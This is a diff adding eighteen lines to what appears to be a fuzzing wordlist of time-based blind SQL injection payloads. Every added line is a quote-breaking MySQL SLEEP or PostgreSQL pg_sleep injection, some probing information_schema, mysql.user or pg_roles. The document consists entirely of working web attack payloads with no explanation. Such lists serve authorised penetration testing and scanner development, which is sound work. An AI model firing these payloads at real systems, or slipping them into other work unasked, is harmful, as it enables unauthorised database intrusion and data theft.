@@ -126,3 +126,21 @@ test%') OR SLEEP(10)--
 ' AND SLEEP(10)# 
 ' OR SLEEP(10)-- -
 ' AND SLEEP(10)-- -
+' OR (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 0)--
+' AND (SELECT SLEEP(10) FROM information_schema.tables LIMIT 1 OFFSET 0)--
+' OR (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1)--
+' AND (SELECT pg_sleep(10) FROM pg_catalog.pg_class LIMIT 1)--
+' OR (SELECT SLEEP(10) FROM mysql.user LIMIT 1)--
+' AND (SELECT SLEEP(10) FROM mysql.user LIMIT 1)--
+' OR (SELECT pg_sleep(10) FROM pg_roles LIMIT 1)--
+' AND (SELECT pg_sleep(10) FROM pg_roles LIMIT 1)--
+' OR IF(EXISTS(SELECT 1),SLEEP(10),0)--
+' AND IF(EXISTS(SELECT 1),SLEEP(10),0)--
+' OR (SELECT CASE WHEN EXISTS(SELECT 1) THEN SLEEP(10) END)--
+' AND (SELECT CASE WHEN EXISTS(SELECT 1) THEN SLEEP(10) END)--
+' OR (SELECT CASE WHEN EXISTS(SELECT 1) THEN pg_sleep(10) END)--
+' AND (SELECT CASE WHEN EXISTS(SELECT 1) THEN pg_sleep(10) END)--
+' OR SLEEP(10*1)--
+' AND SLEEP(10*1)--
+' OR pg_sleep(10*1)--
+' AND pg_sleep(10*1)--
